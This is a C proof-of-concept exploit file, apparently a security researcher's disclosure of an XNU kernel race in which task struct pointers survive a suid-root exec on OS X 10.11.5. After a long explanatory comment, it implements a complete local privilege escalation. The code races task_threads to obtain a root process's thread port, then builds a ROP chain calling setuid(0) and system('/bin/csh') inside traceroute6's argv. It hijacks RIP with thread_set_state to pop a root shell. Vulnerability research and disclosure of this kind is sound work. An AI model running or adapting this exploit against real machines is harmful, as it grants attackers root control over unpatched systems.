// ianbeer

// clang -O3 -o task_nicely_t task_nicely_t.c

/*
task_t considered harmful

TL;DR
you cannot hold or use a task struct pointer and expect the euid of that task to stay the same.
Many many places in the kernel do this and there are a great many very exploitable bugs as a result.

********

task_t is just a typedef for a task struct *. It's the abstraction level which represents a whole task
comprised of threads and a virtual memory map.

task_t's have a corrisponding mach port type (IKOT_TASK) known as a task port. The task port structure
in the kernel has a pointer to the task struct which it represents. If you have send rights to a task port then
you have control over its VM and, via task_threads, its threads.

When a suid-root binary is executed the kernel invalidates the old task and thread port structures setting their
object pointers to NULL and allocating new ports instead.

CVE-2016-1757 was a race condition concerning the order in which those port structures were invalidated during the
exec operation.

Although the issues I will describe in this bug report may seem similar is is a completely different, and far worse,
bug class.

~~~~~~~~~

When a suid binary is executed it's true that the task's old task and thread ports get invalidated, however, the task
struct itself stays the same. There's no fork and no creation of a new task. This means that any pointers to that task struct
now point to the task struct of an euid 0 process.

There are lots of IOKit drivers which save task struct pointers as members; see my recent bug reports for some examples.

In those cases I reported there was another bug, namely that they weren't taking a reference on the task struct meaning
that if we killed the corrisponding task and then forked and exec'ed a suid root binary we could get the IOKit object
to interact via the task struct pointer with the VM of a euid 0 process. (You could also break out of a sandbox by
forcing launchd to spawn a new service binary which would reuse the free'd task struct.)

However, looking more closely, even if those IOKit drivers *do* take a reference on the task struct it doesn't matter!
(at least not when there are suid binaries around.) Just because the userspace client of the user client had send rights
to a task port at time A when it passed that task port to IOKit doesn't mean that it still has send rights to it when
the IOKit driver actually uses the task struct pointer... In the case of IOSurface this lets us trivially map any RW area
of virtual memory in an euid 0 process into ours and write to it. (See the other exploit I sent for that IOSurface bug.)

There are a large number of IOKit drivers which do this (storing task struct pointers) and then either use the to manipulate
userspace VM (eg IOAcceleratorFamily2, IOThunderboltFamily, IOSurface) or rely on that task struct pointer to perform
authorization checks like the code in IOHIDFamily.

Another interesting case to consider are task struct pointers on the stack.

in the MIG files for the user/kernel interface task ports are subject to the following intran:

  type task_t = mach_port_t
  #if KERNEL_SERVER
      intran: task_t convert_port_to_task(mach_port_t)

where convert_port_to_task is:

  task_t
  convert_port_to_task(
    ipc_port_t    port)
  {
    task_t    task = TASK_NULL;

    if (IP_VALID(port)) {
      ip_lock(port);

      if (  ip_active(port)         &&
          ip_kotype(port) == IKOT_TASK    ) {
        task = (task_t)port->ip_kobject;
        assert(task != TASK_NULL);

        task_reference_internal(task);
      }

      ip_unlock(port);
    }

    return (task);
  }

This converts the task port into the corrisponding task struct pointer. It takes a reference on the task struct but that only
makes sure that it doesn't get free'd, not that its euid doesn't change as the result of the exec of an suid root binary.

As soon as that port lock is dropped the task could exec a suid-root binary and although this task port would no longer be valid
that task struct pointer would remain valid.

This leads to a huge number of interesting race conditions. Grep the source for all .defs files which take a task_t to find them all ;-)

In this exploit PoC I'll target perhaps the most interesting one: task_threads.

Let's look at how task_threads actually works, including the kernel code which is generated by MiG:

In task_server.c (an autogenerated file, build XNU first if you can't find this file) :

  target_task = convert_port_to_task(In0P->Head.msgh_request_port);

  RetCode = task_threads(target_task, (thread_act_array_t *)&(OutP->act_list.address), &OutP->act_listCnt);
  task_deallocate(target_task);

This gives us back the task struct from the task port then calls task_threads:
(unimportant bits removed)

  task_threads(
    task_t          task,
    thread_act_array_t    *threads_out,
    mach_msg_type_number_t  *count)
  {
    ...
    for (thread = (thread_t)queue_first(&task->threads); i < actual;
          ++i, thread = (thread_t)queue_next(&thread->task_threads)) {
      thread_reference_internal(thread);
      thread_list[j++] = thread;
    }

    ...

      for (i = 0; i < actual; ++i)
        ((ipc_port_t *) thread_list)[i] = convert_thread_to_port(thread_list[i]);
      }
    ...
  }

task_threads uses the task struct pointer to iterate through the list of threads, then creates send rights to them
which get sent back to user space. There are a few locks taken and dropped in here but they're irrelevant.

What happens if that task is exec-ing a suid root binary at the same time?

The relevant parts of the exec code are these two points in ipc_task_reset and ipc_thread_reset:

  void
  ipc_task_reset(
    task_t    task)
  {
    ipc_port_t old_kport, new_kport;
    ipc_port_t old_sself;
    ipc_port_t old_exc_actions[EXC_TYPES_COUNT];
    int i;

    new_kport = ipc_port_alloc_kernel();
    if (new_kport == IP_NULL)
      panic("ipc_task_reset");

    itk_lock(task);

    old_kport = task->itk_self;

    if (old_kport == IP_NULL) {
      itk_unlock(task);
      ipc_port_dealloc_kernel(new_kport);
      return;
    }

    task->itk_self = new_kport;
    old_sself = task->itk_sself;
    task->itk_sself = ipc_port_make_send(new_kport);
    ipc_kobject_set(old_kport, IKO_NULL, IKOT_NONE); <-- point (1)

  ... then calls:

  ipc_thread_reset(
    thread_t  thread)
  {
    ipc_port_t old_kport, new_kport;
    ipc_port_t old_sself;
    ipc_port_t old_exc_actions[EXC_TYPES_COUNT];
    boolean_t  has_old_exc_actions = FALSE; 
    int      i;

    new_kport = ipc_port_alloc_kernel();
    if (new_kport == IP_NULL)
      panic("ipc_task_reset");

    thread_mtx_lock(thread);

    old_kport = thread->ith_self;

    if (old_kport == IP_NULL) {
      thread_mtx_unlock(thread);
      ipc_port_dealloc_kernel(new_kport);
      return;
    }

    thread->ith_self = new_kport; <-- point (2)

Point (1) clears out the task struct pointer from the old task port and allocates a new port for the task.
Point (2) does the same for the thread port.

Let's call the process which is doing the exec process B and the process doing task_threads() process A and imagine
the following interleaving of execution:

  Process A: target_task = convert_port_to_task(In0P->Head.msgh_request_port); // gets pointer to process B's task struct

  Process B: ipc_kobject_set(old_kport, IKO_NULL, IKOT_NONE); // process B invalidates the old task port so that it no longer has a task struct pointer

  Process B: thread->ith_self = new_kport // process B allocates new thread ports and sets them up

  Process A: ((ipc_port_t *) thread_list)[i] = convert_thread_to_port(thread_list[i]); // process A reads and converts the *new* thread port objects!

Note that the fundamental issue here isn't this particular race condition but the fact that a task struct pointer can just
never ever be relied on to have the same euid as when you first got hold of it.

~~~~~~~~~~~~~~~

Exploit:

This PoC exploits exactly this race condition to get a thread port for an euid 0 process. Since we've execd it I just stick a
ret-slide followed by a small ROP payload on the actual stack at exec time then use the thread port to set RIP to a gadget
which does a large add rsp, X and pop's a shell :)

just run it for a while, it's quite a tight race window but it will work! (try a few in parallel)

tested on OS X 10.11.5 (15F34) on MacBookAir5,2
*/

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/stat.h>

#include <libkern/OSAtomic.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_vm.h>
#include <mach/task.h>
#include <mach/task_special_ports.h>
#include <mach/thread_status.h>

#define MACH_ERR(str, err) do { \
  if (err != KERN_SUCCESS) {    \
    mach_error("[-]" str "\n", err); \
    exit(EXIT_FAILURE);         \
  }                             \
} while(0)

#define FAIL(str) do { \
  printf("[-] " str "\n");  \
  exit(EXIT_FAILURE);  \
} while (0)

#define LOG(str) do { \
  printf("[+] " str"\n"); \
} while (0)

/***************
 * port dancer *
 ***************/

// set up a shared mach port pair from a child process back to its parent without using launchd
// based on the idea outlined by Robert Sesek here: https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html

// mach message for sending a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
} port_msg_send_t;

// mach message for receiving a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
  mach_msg_trailer_t trailer;
} port_msg_rcv_t;

typedef struct {
  mach_msg_header_t  header;
} simple_msg_send_t;

typedef struct {
  mach_msg_header_t  header;
  mach_msg_trailer_t trailer;
} simple_msg_rcv_t;

#define STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT

// a copy in the parent of the stolen special port such that it can be restored
mach_port_t saved_special_port = MACH_PORT_NULL;

// the shared port right in the parent
mach_port_t shared_port_parent = MACH_PORT_NULL;

void setup_shared_port() {
  kern_return_t err;
  // get a send right to the port we're going to overwrite so that we can both
  // restore it for ourselves and send it to our child
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &saved_special_port);
  MACH_ERR("saving original special port value", err);

  // allocate the shared port we want our child to have a send right to
  err = mach_port_allocate(mach_task_self(),
                           MACH_PORT_RIGHT_RECEIVE,
                           &shared_port_parent);

  MACH_ERR("allocating shared port", err);

  // insert the send right
  err = mach_port_insert_right(mach_task_self(),
                               shared_port_parent,
                               shared_port_parent,
                               MACH_MSG_TYPE_MAKE_SEND);
  MACH_ERR("inserting MAKE_SEND into shared port", err);

  // stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);
  MACH_ERR("setting special port", err);
}

mach_port_t recover_shared_port_child() {
  kern_return_t err;

  // grab the shared port which our parent stashed somewhere in the special ports
  mach_port_t shared_port_child = MACH_PORT_NULL;
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &shared_port_child);
  MACH_ERR("child getting stashed port", err);

  //LOG("child got stashed port");

  // say hello to our parent and send a reply port so it can send us back the special port to restore

  // allocate a reply port
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err);

  // send the reply port in a hello message
  simple_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port_child;

  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);

  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);

  //LOG("child sent hello message to parent over shared port");

  // wait for a message on the reply port containing the stolen port to restore
  port_msg_rcv_t stolen_port_msg = {0};
  err = mach_msg(&stolen_port_msg.header, MACH_RCV_MSG, 0, sizeof(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
  MACH_ERR("child receiving stolen port\n", err);

  // extract the port right from the message
  mach_port_t stolen_port_to_restore = stolen_port_msg.port.name;
  if (stolen_port_to_restore == MACH_PORT_NULL) {
    FAIL("child received invalid stolen port to restore");
  }

  // restore the special port for the child
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);
  MACH_ERR("child restoring special port", err);

  //LOG("child restored stolen port");
  return shared_port_child;
}

mach_port_t recover_shared_port_parent() {
  kern_return_t err;

  // restore the special port for ourselves
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);
  MACH_ERR("parent restoring special port", err);

  // wait for a message from the child on the shared port
  simple_msg_rcv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port_parent,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child hello message", err);

  //LOG("parent received hello message from child");

  // send the special port to our child over the hello message's reply port
  port_msg_send_t special_port_msg = {0};

  special_port_msg.header.msgh_size        = sizeof(special_port_msg);
  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;
  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;
  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), 0) | MACH_MSGH_BITS_COMPLEX;
  special_port_msg.body.msgh_descriptor_count = 1;

  special_port_msg.port.name        = saved_special_port;
  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&special_port_msg.header);
  MACH_ERR("parent sending special port back to child", err);

  return shared_port_parent;
}

/*** end of port dancer code ***/

void do_child(mach_port_t shared_port) {
  kern_return_t err;

  // create a reply port to receive an ack that we should exec the target
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err);

  // send our task port to our parent over the shared port
  port_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port;
  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;

  msg.body.msgh_descriptor_count = 1;

  msg.port.name = mach_task_self();
  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);
}

mach_port_t do_parent(mach_port_t shared_port) {
  kern_return_t err;

  // wait for our child to send us its task port
  port_msg_rcv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child task port message", err);

  mach_port_t child_task_port = msg.port.name;
  if (child_task_port == MACH_PORT_NULL) {
    FAIL("invalid child task port");
  }

  //LOG("parent received child's task port");

  return child_task_port;
}

// based on the PoC here: https://dividead.wordpress.com/2009/07/21/blocking-between-execution-and-main/
void create_full_pipe(int* read_, int* write_) {
  int pipefds[2];
  pipe(pipefds);

  int read_end = pipefds[0];
  int write_end = pipefds[1];

  // make the pipe nonblocking so we can fill it
  int flags = fcntl(write_end, F_GETFL);
  flags |= O_NONBLOCK;
  fcntl(write_end, F_SETFL, flags);

  // fill up the write end
  int ret, count = 0;
  do {
    char ch = ' ';
    ret = write(write_end, &ch, 1);
    count++;
  } while (!(ret == -1 && errno == EAGAIN));
  printf("wrote %d bytes to pipe buffer\n", count-1);

  // make it blocking again
  flags = fcntl(write_end, F_GETFL);
  flags &= ~O_NONBLOCK;
  fcntl(write_end, F_SETFL, flags);

  *read_ = read_end;
  *write_ = write_end;
}

// fork and exec the binary child target
// setting its stdout/stderr to the write end of a full pipe
//
// return the read end in blocker allowing the child to
// be blocked on write operations as long as it doesn't
// fcntl O_NONBLOCK stdout/stderr

int fork_and_exec_blocking(char* target, char** argv, char** envp, int* pid) {
  // save the old stdout/stderr fd's
  int saved_stdout = dup(1);
  int saved_stderr = dup(2);

  // create the pipe
  int pipefds[2];
  pipe(pipefds);

  int read_end = pipefds[0];
  int write_end = pipefds[1];

  // make the pipe nonblocking so we can fill it
  int flags = fcntl(write_end, F_GETFL);
  flags |= O_NONBLOCK;
  fcntl(write_end, F_SETFL, flags);

  // fill up the write end
  int ret, count = 0;
  do {
    char ch = ' ';
    ret = write(write_end, &ch, 1);
    count++;
  } while (!(ret == -1 && errno == EAGAIN));
  printf("wrote %d bytes to pipe buffer\n", count-1);


  // make it blocking again
  flags = fcntl(write_end, F_GETFL);
  flags &= ~O_NONBLOCK;
  fcntl(write_end, F_SETFL, flags);

  // set the pipe write end to stdout/stderr
  dup2(write_end, 1);
  dup2(write_end, 2);

  int child_pid = fork();

  if (child_pid == 0) {
    // exec the target, writes to stdout/stderr will block until
    // the parent reads from blocker
    //execl(target, target, NULL); // noreturn
    execve(target, argv, envp);
  }

  // restore parents stdout/stderr
  dup2(saved_stdout, 1);
  dup2(saved_stderr, 2);

  close(saved_stdout);
  close(saved_stderr);

  close(write_end);

  if (pid) {
    *pid = child_pid;
  }
  return read_end;
}

int fork_and_exec(const char* path, char** argv, char** envp) {
  pid_t child_pid = fork();

  if (child_pid == -1) {
    FAIL("forking");
  }

  if (child_pid == 0) {
    execve(path, argv, envp);
  }

  return child_pid;
}

/*
setup the ROP payload and stuff

Since we can block the process on writes we'll pass an invalid -w option to traceroute6
which leads to this code:

  fprintf(stderr, "traceroute6: invalid wait time.\n");
  exit(1);

The process will block on the write and importantly that happens before traceroute6 tries (incorrectly...)
to drop privs so we still have euid 0.

While the process is waiting here we can use the bug to get an IOSurface which wraps
the page of the target's libsystem_c.dylib:__DATA segment which contains the __cleanup pointer.
If __cleanup is non-null it will be called by exit().

There's no need to try to pivot the stack anywhere; since we exec'd this program we can put a large amount of
data on the stack so we just need to point __cleanup to a gadget which does a large add rsp, X;...;ret

This function returns an argv array containing the ROP stack as well as the addresses the rest of the
exploit needs to find __cleanup;
*/

// how many null bytes in this uint64?
int count_nulls(uint64_t val) {
  int nulls = 0;
  uint8_t* bytes = (uint8_t*)&val;
  for (int i = 0; i < 8; i++){
    if (bytes[i] == 0) {
      nulls++;
    }
  }
  return nulls;
}

// we use this to get code execution
// when the target calls exit it will call this function pointer
// libsystem_c.dylib exports it so we can just get the loader to resolve it for us
extern void** __cleanup;

char** setup_payload_and_offsets(uint64_t* stack_shift, uint64_t* fptr_page, uint32_t* fptr_offset) {
  *fptr_page = (uint64_t)((unsigned long long)(&__cleanup) & ~(0xfffULL));
  *fptr_offset = ((uint64_t)(&__cleanup)) - *fptr_page;

  // ret slide gadget with no NULL bytes other than the top two as we'll need many copies
  uint8_t* ret = (uint8_t*)&strcpy; // the start of libsystem_c
  do {
    ret += 1;
    ret = memmem(ret, 0x1000000, "\xc3", 1);
  } while (ret != NULL && ((count_nulls((uint64_t)ret)) != 2) );

  if (ret == NULL) {
    FAIL("couldn't find suitable ret gadget\n");
  }

  // pop rdi ret gadget
  uint8_t* pop_rdi_ret = memmem(&strcpy, 0x1000000, "\x5f\xc3", 2);
  if (pop_rdi_ret == NULL) {
    FAIL("couldn't find pop rdi; ret gadget\n");
  }

  // /bin/sh string:
  void* bin_sh = ((char*)__cleanup)-(1024*1024); // start from 1MB below this symbol in libsystem_c.dylib
  bin_sh = memmem(bin_sh, 2*1024*1024, "/bin/csh", 9);
  if (bin_sh == NULL) {
    printf("couldn't find /bin/sh string\n");
    return NULL;
  }

  // realpath has a massive stack frame, should be large enough:
  // find the add rsp, X at the end of it:
  uint8_t* stack_shift_gadget = memmem(&realpath, 0x4000, "\x48\x81\xc4", 3); 
  if (stack_shift == NULL) {
    printf("couldn't find stack shift\n");
    return NULL;
  }

  // approximately how far up the stack will that push us?
  uint32_t realpath_shift_amount = *(uint32_t*)(stack_shift_gadget+3);

  // approximately how big is traceroute6's stack frame?
  uint32_t traceroute6_stack_size = 0x948;

  if (realpath_shift_amount - 0x200 < traceroute6_stack_size) {
    printf("that stack shift gadget probably isn't big enough...\n");
    return NULL;
  }

  *stack_shift = (uint64_t)stack_shift_gadget;

/*

try to work out a good estimate for the number of ret-slide gadgets we need:

                    |                              |
                    |                              |
                    |                              |
                    +------------------------------+
                    |                              |
              +++   |   argv values                |
realpath stack |    |                              |
size           |    +------------------------------+
               |    |                              |
               |    |   argv ptrs                  |
               |    |                              |
               |    +------------------------------+
               |    |                              |     assume argv
               |    |   argv ptrs                  |    +starts here
               |    |                              |    |
               |    +------------------------------+ <---+
               |    |                              |    |  _start stack
               |    |                              |    |  size
               |    |   _start stack frame         |    |
               |    |                              |    |
               |    |                              |    |
               |    |                              |    |
              +++   +------------------------------+   +++

((realpath_stack_size - _start_stack_size) / 8 / 5) * 2

we want the add rsp, realpath_stack_size to end up somewhere near the middle of the argv values
which we can fill with ret-slide gadgets followed by the short real rop stack

since the ret-slide gadgets will contain two NULL bytes we need two argv pointers per ret-slide gadget

if we assume that argv is right above _start's stack frame then we want the difference between
realpath_stack_size and _start_stack_size to be 5/6'ths of the argv ptrs and values area

realpath stack size should be sufficiently big that this will work across multiple versions
*/
  int ret_slide_length = ((realpath_shift_amount - traceroute6_stack_size) / 8 / 5) * 2;

/*
  since we can only pass pointers to NULL terminated strings to execve we
  have to do a bit of fiddling to set up the right argv array for the ROP stack
*/

  char* progname = "/usr/sbi" //8
                   "n/tracer" //8
                   "oute6";   //6
  char* optname  = "-w";      //3
  char* optval   = "LOLLLL";  //7

  size_t target_argv_rop_size = (ret_slide_length + 6)* 8; // ret slides plus three slots for the actual rop

  uint8_t** args_u64 = malloc(target_argv_rop_size + 1); // plus extra NULL byte at the end
  char* args = (char*)args_u64;
  memset(args, 0, target_argv_rop_size + 1);

  // ret-slide
  int i;
  for (i = 0; i < ret_slide_length; i++) {
    args_u64[i] = ret;
  }

  args_u64[i] = pop_rdi_ret;
  args_u64[i+1] = 0;
  args_u64[i+2] = (uint8_t*)&setuid;
  args_u64[i+3] = pop_rdi_ret;
  args_u64[i+4] = bin_sh;
  args_u64[i+5] = (uint8_t*)&system;

  // allocate worst-case size
  
  size_t argv_allocation_size = (ret_slide_length+100)*8*8;
  char** target_argv = malloc(argv_allocation_size);
  memset(target_argv, 0, argv_allocation_size);
  target_argv[0] = progname;
  target_argv[1] = optname;
  target_argv[2] = optval;
  int argn = 3;
  target_argv[argn++] = &args[0];
  for(int i = 1; i < target_argv_rop_size; i++) {
    if (args[i-1] == 0) {
      target_argv[argn++] = &args[i];
    }
  }
  target_argv[argn] = NULL;

  return target_argv;
}

void unblock_pipe(int fd) {
  char buf[65536/2];
  
  int flags = fcntl(fd, F_GETFL);
  flags &= ~O_NONBLOCK;
  fcntl(fd, F_SETFL, flags);

  read(fd, buf, sizeof(buf));
}

void unblock_pipe_and_interact(int fd) {
  char buf[1024];
  
  int flags = fcntl(fd, F_GETFL);
  flags &= ~O_NONBLOCK;
  fcntl(fd, F_SETFL, flags);

  ssize_t ret;
  do {
    ret = read(fd, buf, 1);
    if (ret > 0){
      write(1, buf, ret);
    }
  } while (ret > 0);
}

void sploit_child(int read_end, int write_end) {
  kern_return_t err;

  // setup ROP stack we'll use in the target:
  uint64_t fptr_page = 0;
  uint32_t fptr_offset = 0;
  uint64_t stack_shift_gadget = 0;
  char** argv = setup_payload_and_offsets(&stack_shift_gadget, &fptr_page, &fptr_offset);

  // dup the write end of the pipe to stdout so that our parent can stop the suid-root process
  close(read_end);
  dup2(write_end, 1);
  dup2(write_end, 2);

  // exec the suid-root target 
  execve("/usr/sbin/traceroute6", argv, NULL);
}

int sploit_parent(int child_pid, mach_port_t child_task_port, int read_end, int write_end) {
  kern_return_t err;

  const int max_attempts = 1000;
  void* deallocate_me[max_attempts] = {0};
  mach_msg_type_number_t sizes[max_attempts] = {0};

  // close the write end of the pipe, only the child will be writing to it:
  close(write_end);

  thread_array_t thread_list = NULL;
  mach_msg_type_number_t thread_count = 0;

  // note that you need to vm_deallocate thread_list...
  err = task_threads(child_task_port, &thread_list, &thread_count);
  if (err != KERN_SUCCESS) {
    printf("parent's first call to task_threads was too slow...\n");
    return 0;
  }

  deallocate_me[0] = thread_list;
  sizes[0] = thread_count;

  mach_port_t original_thread_port = thread_list[0];
  if (original_thread_port == MACH_PORT_NULL) {
    printf("original thread port invalid\n");
    goto fail;
  }
  
  mach_port_t new_thread_port = MACH_PORT_NULL;

  for(int i = 1; i < max_attempts; i++) {
    err = task_threads(child_task_port, &thread_list, &thread_count);
    if (err != KERN_SUCCESS){
      printf("didn't win race, task port got invalidated\n");
      goto fail;
    }

    deallocate_me[i] = thread_list;
    sizes[i] = thread_count;

    // if the thread port changed, then we won!
    new_thread_port = thread_list[0];
    if (new_thread_port != original_thread_port && new_thread_port != MACH_PORT_NULL) {
      printf("got a different thread port, maybe on to something....\n");
      break;
    }
  }

  // let the target run until it gets blocked by the full pipe
  // could also just peek in the pipe?
  usleep(100000);

  // where is the target blocked?
  x86_thread_state64_t state;
  mach_msg_type_number_t stateCount = x86_THREAD_STATE64_COUNT;
  err = thread_get_state(new_thread_port, x86_THREAD_STATE64, (thread_state_t)&state, &stateCount);
  if (err != KERN_SUCCESS) {
    printf("getting target thread status\n");
    goto fail;
  }
  
  // we have the thread port for an euid 0 process :-)
  printf("GOT THREAD!\n");
  printf("RIP:%llx\n", state.__rip);

  // find the stack shift gadget address
  uint64_t fptr_page = 0;
  uint32_t fptr_offset = 0;
  uint64_t stack_shift_gadget = 0;
  char** argv = setup_payload_and_offsets(&stack_shift_gadget, &fptr_page, &fptr_offset);

  // set the target's RIP register (which is blocked in the write) to the stack shift gadget
  state.__rip = stack_shift_gadget;

  err = thread_set_state(new_thread_port, x86_THREAD_STATE64, (thread_state_t)&state, stateCount);
  MACH_ERR("setting target thread RIP", err); // something went very wrong if this fails...

  // unblock the pipe which will let the write syscall return then jump to the stack shift gadget
  unblock_pipe_and_interact(read_end);

  int sl;
  wait(&sl);
  return 1;

fail:
  // cleanup the ports and vm from this attempt
  for (int i = 0; i < max_attempts; i++) {
    mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)deallocate_me[i], sizes[i]);
  }

  mach_port_destroy(mach_task_self(), original_thread_port);
  mach_port_destroy(mach_task_self(), new_thread_port);

  return 0;
}

void go() {  
  // create a filled pipe we can use as a blocker:
  int read_end, write_end;
  create_full_pipe(&read_end, &write_end);

  setup_shared_port();
  pid_t child_pid = fork();
  if (child_pid == -1) {
    FAIL("forking");
  }

  if (child_pid == 0) {
    mach_port_t shared_port_child = recover_shared_port_child();
    do_child(shared_port_child);
    sploit_child(read_end, write_end);
  } else {
    mach_port_t shared_port_parent = recover_shared_port_parent();
    mach_port_t child_task_port = do_parent(shared_port_parent);
    int success = sploit_parent(child_pid, child_task_port, read_end, write_end);
    if (!success) {
      // let the child exit so we can try again:
      unblock_pipe(read_end);
      close(read_end);
      int sl;
      wait(&sl);
    }
  }
}
int main(int argc, char** argv) {  
  for(;;) {
    go();
  }
  return 0;
}
